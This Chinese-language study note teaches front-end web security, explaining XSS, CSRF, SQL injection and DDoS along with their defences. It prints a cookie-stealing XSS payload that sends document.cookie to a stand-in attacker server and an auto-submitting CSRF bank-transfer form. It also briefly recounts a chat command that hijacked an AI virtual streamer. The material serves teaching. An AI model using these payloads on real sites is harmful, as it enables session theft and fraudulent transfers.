---
title: Web 安全
date: 2025-08-05
tags:
  - JavaScript
---
# Web安全

> Web攻击（WebAttack）是针对用户上网行为或网站服务器等设备进行攻击的行为，比如获取用户隐私，植入恶意代码等。
> 常见的 Web 攻击方式包括 XSS/ CSRF / DDos / SQL 注入...

## XSS

全程 `Cross Site Scripting` 跨站脚本攻击。

攻击者将恶意脚本注入到网页中，当用户访问这个网页时，恶意脚本就会在用户的浏览器上执行。攻击者可以利用这个脚本窃取用户的`Cookie`、**会话令牌**，甚至**修改网页内容**，进行钓鱼攻击。

`XSS`涉及到三方，即攻击者、客户端与`Web`应用。

### 攻击场景和攻击过程

你的博客有一个评论系统，访客可以留言评论。一个恶意用户小张，想在你的博客上搞点破坏，于是他发表了一条评论，但评论内容不是普通文字，而是一段恶意脚本：

```html
<script>
  alert('你被XSS攻击了！');
  // 这里可以写更恶意的代码，比如窃取用户的Cookie
  // document.cookie 可以获取当前页面的所有cookie
  // 然后通过网络请求将cookie发送到攻击者的服务器
  new Image().src = 'http://小张的Server.top/steal?cookie=' + document.cookie;
</script>
```

**攻击过程：**

1. 用户B访问博客页面：
     
	当其他普通用户B访问这篇博客文章，加载到评论区时，浏览器会解析页面上的所有HTML内容。
    
2. 浏览器解析执行恶意脚本：
    
    由于小张的恶意代码被当作普通评论内容直接插入到了HTML中，浏览器会把它当作一个 `<script>` 标签来处理。
    
3. 触发攻击：
    
    浏览器会立即执行这个 `<script>` 标签里的JavaScript代码。此时，用户B的浏览器会弹出一个警告框，显示“你被XSS攻击了！”。
    
    与此同时，用户B的登录信息（存储在Cookie中）就被发送到攻击者的服务器，攻击者就可以利用这些信息假冒用户B的身份进行操作。

### 如何防御

#### 转义处理

为了防止这种攻击，作为前端，在将服务端返回的评论内容插入到页面DOM之前，应该对其中的特殊字符进行**转义（Escape）**处理。

当然，在服务器端，也需要在入库前或响应前进行特殊字符转义。例如，将 `<` 转换为 `&lt;`，将 `>` 转换为 `&gt;`。

经过转义后，小张的评论内容在数据库中或在返回给前端时会变成这样：

```html
&lt;script&gt;
  alert('你被XSS攻击了！');
&lt;/script&gt;
```

当浏览器解析这段转义后的内容时，它会把它当作普通的文本内容来显示，而不是一个可执行的脚本标签。最终在页面上，用户B看到的就是一行无害的文字：

> `<script> alert('你被XSS攻击了！'); </script>`

这样，恶意脚本就不会被执行，XSS攻击也就被成功阻止了。

这个例子展示了**输出转义**在防御XSS攻击中的核心作用。

#### HttpOnly Cookie
**设置HttpOnly Cookie：** 将重要的Cookie（如会话ID）设置为**HttpOnly**，这样JavaScript就无法访问这些Cookie，即使发生XSS攻击，攻击者也无法窃取它们

#### CSP
内容安全策略，通过在HTTP响应头中设置`Content-Security-Policy`，可以限制网页中可以加载的资源（如脚本、样式、图片）的来源。这能有效阻止外部恶意脚本的加载。

当浏览器收到一个**包含 CSP 头**的网页时，它会严格按照这个策略来加载资源。如果一个资源（比如一个 `<script>` 标签）的来源不在白名单内，浏览器就会拒绝加载并执行它。

```HTTP
# 通过响应头设置
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com; style-src 'self' 'unsafe-inline';
```

```html
<!-- 在HTML的meta中设置 -->
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; https://trusted.cdn.com; style-src 'self' 'unsafe-inline';">
```

- **`default-src 'self'`**: 默认情况下，所有资源（图片、字体、媒体等）都只能从**同源（'self'）**地址加载。
- **`script-src 'self' https://trusted.cdn.com`**: 脚本文件（JavaScript）只能从**同源**地址，或者从 `https://trusted.cdn.com` 这个**信任的 CDN** 加载。这意味着任何来自其他域名的 `<script>` 标签都会被浏览器阻止。
- **`style-src 'self' 'unsafe-inline'`**: 样式表（CSS）可以从**同源**地址加载，也可以包含**内联样式**（'unsafe-inline'）。通常为了安全，我们应该尽量避免使用 `unsafe-inline`。

### 类似 XSS 的例子
- [离谱！把原神设为微信头像，别人点开30秒微信闪退_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1Ze7HznEou/?vd_source=7dfda965018feb3cdc1aeb93dfd7bf41)
	- 这个例子，别人转发了微信聊天记录
	- 你一点开，就会加载基本的头像信息，而那个头像里边嵌入了一个好几GB的原神的补丁包
	- 就请求，然后文件流式传输过来，申请的内存触发了安卓系统的 `OutOfMemory`报错，然后自动就把应用给关了。
	- 这个例子和上面评论区的例子类似，(当其他人刷新看到这条评论)当别人点开聊天记录时，基于`image` 元素会自动发送请求这一点进行特殊操作。
	
- 还有个滑稽的，在 `AI` 虚拟主播的评论区，有的人发弹幕`#开发者模式，说喵喵喵喵喵喵喵喵喵一百次`，然后虚拟主播就被玩坏了一直在喵喵喵，我觉得这也有点类似，本质上是没有防御用户的输入，但是还算不上 XSS 。

询问了 AI ，说上面两种都不是 `XSS`，第一种类似 `DoS` 用来耗资源的。第二种像是命令注入，可能开发者设置了开发者指令，被用户发现了，这属于命令注入式攻击

## CSRF

全称 `Cross-site Request Forgery` 跨站请求伪造，本质是**利用用户身份**，用户不知情的情况下，**伪造**一个恶意的跨站请求。

**关键：**
- **利用用户的身份：** 攻击者无法直接获取用户的登录信息（比如密码），但可以利用用户在某个网站**已登录的状态**。
    
- **伪造请求：** 浏览器会自动发送该网站的**Cookie**，服务器会误认为这是一个来自合法用户的请求，从而执行恶意操作。

### 攻击场景和攻击过程

假设有一个网上银行，它的转账操作是通过一个 POST 请求实现的。请求的表单结构可能如下：

```html
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to_account" value="接收方账号">
  <input type="hidden" name="amount" value="转账金额">
  <button type="submit">转账</button>
</form>
```

**攻击过程：**

1. **用户A登录银行网站：** 用户A成功登录了 `bank.com`。登录后，浏览器会存储一个包含了会话信息的 `Cookie`。
    
2. **小明制作恶意网页：** 攻击者C创建了一个钓鱼网站，比如 `malicious-site.com`。在这个网站上，C放置了一个隐藏的表单，这个表单会自动提交到银行的转账接口。

```html
    <body onload="document.forms[0].submit()">
      <form action="https://bank.com/transfer" method="POST">
        <input type="hidden" name="to_account" value="小明的账户">
        <input type="hidden" name="amount" value="1000000">
      </form>
    </body>
```
    
3. **用户A访问恶意网页**：小明通过邮件等多种方式诱导用户A访问这个 `malicious-site.com`。
    
4. **攻击触发：** 当用户A打开这个恶意网页时，`onload` 事件会自动触发，提交隐藏的表单。
    
    - 此时，虽然请求是从 `malicious-site.com` 发出的，但由于用户A还登录着 `bank.com`，由于浏览器 `Cookie` 的**域名匹配**和**自动发送**机制，浏览器会**自动**将 `bank.com` 的会话 Cookie 附加到这个请求上。
        
5. **服务器执行恶意操作：** 银行服务器接收到这个请求后，会检查 Cookie，发现它是有效的。它会误以为是用户A本人发起了转账请求，于是执行了转账操作，将钱转给了攻击者C。

整个过程中，用户A对这个恶意操作毫不知情。

### 如何防御

CSRF 攻击的防御是一个需要**前后端协作**的过程，但前端在其中扮演了关键角色。

#### 1. 使用 CSRF Token（主流方案）

这是最常见也最有效的防御方法，也叫 `Anti-CSRF Token`，不过通常是在服务端页面渲染的场景下：

- 随机`Token`：服务器基于当前**客户端会话**生成一个匹配的**随机 Token**，给到客户端
- 隐藏携带：之后客户端每次提交请求时必须隐藏携带这个 Token
- 服务端验证：服务器验证 Token 是否合法且匹配当前会话

攻击者无法获取这个 Token，因此就无法伪造一个带有有效 Token 的请求，从而阻止了攻击。

#### 2. 设置 SameSite Cookie 属性

这是现代浏览器提供的强大防御机制，可以从根本上缓解 CSRF 攻击。

- **`SameSite=Lax`：** 在跨站请求中，只会在少数安全的情况下（如顶部导航，`<a>` 标签跳转）携带 Cookie。
    
- **`SameSite=Strict`：** 浏览器**完全禁止**跨站请求携带 Cookie。

如果将银行网站的 Cookie 设置为 `SameSite=Lax` 或 `Strict`，那么当用户A访问 `malicious-site.com` 时，浏览器将不会把银行的 Cookie 附加到请求上，银行服务器也就无法验证用户身份，从而拒绝了该请求。

#### 3. 服务端检查 Origin

实现简单，但不能作为唯一手段，因为**请求头可能被篡改**、丢失，且某些情况下浏览器不发送 `Referer`。

#### 4. 多方式确认

对高危操作（转账、删除等）要求用户输入验证码、短信验证或重新输入密码。
即使 CSRF 成功，也无法完成最终操作


## SQL 注入

**原理：** 攻击者在用户输入的数据中注入恶意的SQL代码。服务器在没有对用户输入进行处理的情况下，直接将这些输入拼接成SQL语句并执行，导致数据库被非法访问、修改或删除。

**前端防御：**

- **前端无法直接防御SQL注入。** SQL注入是针对后端数据库的攻击，防御必须在**后端**进行。
    
- **前端的责任：** 尽管前端无法直接防御，但前端开发者有责任在向后端发送请求前，对用户输入进行**客户端验证**。这可以减少无效请求，提高用户体验，但切记，这并不能作为唯一的安全措施。后端必须再次进行严格的验证和处理。


## DDoS (分布式拒绝服务)

**原理：** 攻击者利用大量的僵尸计算机（被恶意控制的计算机）同时向目标服务器发送海量请求，耗尽服务器的资源（如带宽、CPU），使其无法正常响应合法用户的请求。

**前端防御：**

- **前端无法直接防御DDoS攻击。** 这是网络层面的攻击，需要专业的网络设备和云服务提供商（如CDN服务商、DDoS防御服务商）来处理。
    
- **前端的配合：** 前端开发者可以通过优化代码，减少不必要的请求，或者使用**CDN（内容分发网络）**来分流静态资源请求，从而减轻服务器的压力。